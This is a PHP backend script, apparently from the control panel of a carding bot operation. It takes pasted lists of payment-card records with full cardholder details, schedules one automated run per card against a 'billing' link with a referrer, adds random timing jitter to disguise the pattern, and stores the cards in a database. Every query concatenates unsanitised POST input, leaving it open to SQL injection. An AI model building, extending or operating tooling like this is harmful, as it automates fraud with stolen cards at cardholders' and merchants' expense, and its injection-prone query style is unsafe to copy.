<?php

require_once 'mod_dbase.php';
require_once 'mod_time.php';
require_once 'mod_crypt.php';

$dbase = db_open();
if (!$dbase) exit;

// Вставляем инфу по глобальному заданию
	
$StartTime = $_POST['SDGT_'];
$FinishTime = $_POST['FDGT_'];
$ChkCt = $_POST['ChkCt'];
(@($ChkCt)) ? $ChkCt = 1 : $ChkCt = 0;
$ChkSt = $_POST['ChkSt'];
(@($ChkSt)) ? $ChkSt = 1 : $ChkSt = 0;
$Link = $_POST['ULGT_'];
$RefLink = $_POST['REFULGT_'];

$match = preg_split("/\n/", $_POST['PARSGT_']);
$BotsCount = count($match);
if ($BotsCount < 1) {
	echo "There are no any entered card";
	db_close($dbase);
	exit();
}
$Note = $_POST['NOTE'];

// Вставляем Link на биллинг
$sql = "SELECT id_url"
	 . " FROM urls_t"
	 . " WHERE text_url_urls like '$Link'"
	 . " LIMIT 0, 1";
$res = mysqli_query($dbase, $sql);
if ((!(@($res))) || mysqli_num_rows($res) == 0) {
	$sql = " INSERT INTO urls_t"
		 . " VALUES (null, '$Link')";
	$res = mysqli_query($dbase, $sql);
	$link_id = mysqli_insert_id($dbase);
}
else {
	$mres = mysqli_fetch_array($res);
	$link_id = $mres[0];
}

// Вставляем RefLink
$sql = "SELECT id_url"
	 . " FROM urls_t"
	 . " WHERE text_url_urls like '$RefLink'"
	 . " LIMIT 0, 1";
$res = mysqli_query($dbase, $sql);
if ((!(@($res))) || mysqli_num_rows($res) == 0) {
	$sql = " INSERT INTO urls_t"
		 . " VALUES (null, '$RefLink')";
	$res = mysqli_query($dbase, $sql);
	$reflink_id = mysqli_insert_id($dbase);
}
else {
	$mres = mysqli_fetch_array($res);
	$reflink_id = $mres[0];
}
	
// Создаём глобальное задание
$sql = " INSERT INTO global_tasks_t"
	 . " VALUES (null, '$StartTime', '$FinishTime', $ChkCt, $ChkSt, $BotsCount, $link_id,$reflink_id, '$Note', 0)";
$res = mysqli_query($dbase, $sql);
if (mysqli_affected_rows($dbase) != 1) {
	echo "Cannot insert to global_tasks_t (\"$sql\")";
	db_close($dbase);
	exit();
}

$_id_gt = mysqli_insert_id($dbase);

$interval = (GetTimeStamp($FinishTime) - GetTimeStamp($StartTime))/( $BotsCount );

for ($i = 0; $i < $BotsCount; $i++) {
	$time = GetTimeStamp($StartTime) + ($interval * $i);
	
	// Вносим хаос
	$rndk = rand(0, 33) / 100;
	if (!rand(0, 1))
		$rndk *= (-1);
	$time += $interval * $rndk;
	 
	$time = gmdate('Y.m.d H:i:s', $time);
	
	$sql = " INSERT INTO dtimes_run_t "
		 . " VALUES (null, '$time', $_id_gt, null)";
	$res = mysqli_query($dbase, $sql);
	if (mysqli_affected_rows($dbase) != 1) {
		echo "Cannot create task (\"$sql\")";
		db_close($dbase);
		exit();
	}
}

// Вставляем реквизиты карт
$match = preg_split("/\n/", $_POST['PARSGT_']);
if (count($match)) {

	for ($i = 0; $i < count($match); $i++) {
		$link = trim($match[$i]);
	
		if (strlen(trim($link)) == 0) continue;

		list($num_card, $csc, $exp_date, $name, $surname, $address, $city, $state, $post_code, $country, $tel, $email) = split("[;\t]", $link);

		$num_card = trim($num_card);
		$csc = trim($csc);
		$exp_date = trim($exp_date);
		$name = trim($name);
		$surname = trim($surname);
		$address = trim($address);
		$city = trim($city);
		$state = trim($state);
		$post_code = trim($post_code);
		$country = trim($country);
		$tel = trim($tel);
		$email = trim($email);
		
		list($month, $year) = split('[\/.-]', $exp_date);
		$exp_date = gmdate("Y.m.d H:i:s", mktime(0,0,0,$month,1,$year));

		$sql = "SELECT id_email"
			 . " FROM email_t"
			 . " WHERE value_email like '$email'"
			 . " LIMIT 0, 1";
		$res = mysqli_query($dbase, $sql);

		if ((@($res)) && mysqli_num_rows($res)) {
			$mres = mysqli_fetch_array($res);
			$id_email = $mres[0];
		}
		else {
			$sql = " INSERT INTO email_t"
				 . " VALUES (null, '$email')";
			$res = mysqli_query($dbase, $sql);
			$id_email = mysqli_insert_id($dbase);
		}

		$sql = "SELECT id_country"
			 . " FROM country_t"
			 . " WHERE name_country like '$country'"
			 . " LIMIT 0, 1";
		$res = mysqli_query($dbase, $sql);
	
		if ((@($res)) && mysqli_num_rows($res)) {
			$mres = mysqli_fetch_array($res);
			$id_country = $mres[0];
		}
		else {
			$sql = " INSERT INTO country_t"
				 . " VALUES (null,'$country')";
			$res = mysqli_query($dbase, $sql);
	 
			$id_country = mysqli_insert_id($dbase);	 
		}

		if ($csc == '')
			$csc = 0;

		if ($id_email == '')
			$id_email = 0;

		if ($id_country == '')
			$id_country = 0;

		$num_card = base64_encode(encode($num_card, $csc));

		$city = str_replace("'", "\'", $city);
		
		$sql = " INSERT INTO cards"
			 . " VALUES ('NULL', '$num_card', '$csc', '$exp_date', '$name', '$surname', '$address', '$city', '$state', '$post_code', '$tel', '0', '$id_email', '$id_country', '$_id_gt')";
		$res = mysqli_query($dbase, $sql);
		
		if ((@($res))/* && mysqli_insert_id($dbase)*/)
			$cnt++;
		else {
			echo "Cannot insert this info: \"$link\"<br>$sql<p>";
			break;
		}
	}
	
	if ((@($cnt)) && $cnt > 0)
		echo "<br><b>$cnt records</b> was <font class='ok'>successfully</font> inserted<br>";
}

db_close($dbase);

?>